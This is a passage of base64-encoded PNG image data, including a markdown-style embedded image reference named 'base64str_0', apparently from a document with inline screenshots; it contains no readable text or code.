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

[base64str_0]:data:image/png;base64,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